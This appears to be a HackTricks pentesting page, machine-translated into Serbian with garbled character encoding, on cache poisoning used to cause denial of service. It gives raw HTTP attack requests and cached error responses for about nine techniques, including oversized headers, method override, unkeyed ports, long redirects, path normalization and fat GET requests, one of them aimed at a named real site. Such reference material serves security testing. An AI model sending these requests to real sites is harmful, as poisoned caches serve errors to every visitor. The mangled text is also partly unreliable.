# Cache Poisoning to DoS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="danger" %}
Na ovoj stranici mo쬰te prona캖i razli캜ite varijacije koje mo쬰te isprobati da naterate **web server da odgovori gre코kama** na zahteve koji su **validni za cache servere**
{% endhint %}

* **HTTP Header Oversize (HHO)**

Po코aljite zahtev sa veli캜inom headera ve캖om od one koju podr쬬va web server, ali manjom od one koju podr쬬va cache server. Web server 캖e odgovoriti sa 400 odgovorom koji mo쬰 biti ke코iran:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP Meta Character (HMC) & Unexpected values**

Po코aljite zaglavlje koje sadr쬴 neke **코tetne meta karaktere** kao 코to su  i . Da bi napad uspeo, prvo morate da zaobi캠ete ke코.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
Lo코e konfigurisana zaglavlja mogu biti samo `\:` kao zaglavlje.

Ovo tako캠e mo쬰 raditi ako se po코alju neo캜ekivane vrednosti, poput neo캜ekivanog Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Unkeyed header**

Neki veb sajtovi 캖e vratiti kod gre코ke ako **vide neke specifi캜ne zaglavlja** u zahtevu kao 코to je sa _X-Amz-Website-Location-Redirect: someThing_ zaglavljem:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP Method Override Attack (HMO)**

Ako server podr쬬va promenu HTTP metode pomo캖u zaglavlja kao 코to su `X-HTTP-Method-Override`, `X-HTTP-Method` ili `X-Method-Override`. Mogu캖e je zatra쬴ti va쬰캖u stranicu menjaju캖i metodu tako da server ne podr쬬va, tako da se lo코 odgovor ke코ira:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Nepovezani Port**

Ako je port u Host header-u odra쬰n u odgovoru i nije uklju캜en u klju캜 ke코a, mogu캖e je preusmeriti ga na neiskori코캖en port:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Long Redirect DoS**

Kao u slede캖em primeru, x se ne ke코ira, tako da napada캜 mo쬰 da iskoristi pona코anje odgovora na preusmerenje da napravi preusmerenje koje 코alje URL toliko veliki da vra캖a gre코ku. Tada 캖e ljudi koji poku코avaju da pristupe URL-u bez neke코iranog x klju캜a dobiti odgovor sa gre코kom:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Normalizacija velikih i malih slova u host header-u**

Host header bi trebao biti neosetljiv na velika i mala slova, ali neka web stranice o캜ekuju da bude napisan malim slovima, vra캖aju캖i gre코ku ako nije:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Normalizacija putanje**

Neke stranice 캖e vra캖ati kodove gre코ke 코alju캖i podatke URLencode u putanji, me캠utim, ke코 server 캖e URLdecode putanju i sa캜uvati odgovor za URLdecoded putanju:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

Neki ke코 serveri, kao 코to su Cloudflare, ili veb serveri, zaustavljaju GET zahteve sa telom, tako da se ovo mo쬰 iskoristiti za ke코iranje neva쬰캖eg odgovora:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## References

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr코ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
